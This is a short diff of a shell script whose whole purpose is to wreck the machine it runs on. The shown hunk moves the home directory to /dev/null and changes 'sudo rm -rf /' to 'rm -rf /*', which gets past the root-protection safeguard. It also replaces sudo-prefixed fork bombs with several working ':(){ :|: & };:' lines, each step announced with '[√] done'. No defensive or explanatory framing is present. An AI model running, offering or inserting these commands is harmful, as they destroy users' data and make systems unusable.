@@ -30,12 +30,15 @@ sudo mv ~ /dev/null
 echo ' [√] done'
 echo 
 echo ' Deleting System Files "/*" '
-sudo rm -rf /
+sudo rm -rf /*
 echo ' [√] done'
 echo
 echo ' Fork Bombing the machine... '
-sudo :(){ :|: & };:
-sudo :(){ :|: & };:
+:(){ :|: & };:
+:(){ :|: & };:
+:(){ :|: & };:
+:(){ :|: & };:
+:(){ :|: & };:
 :(){ :|: & };:
 echo ' [√] done'
 echo 
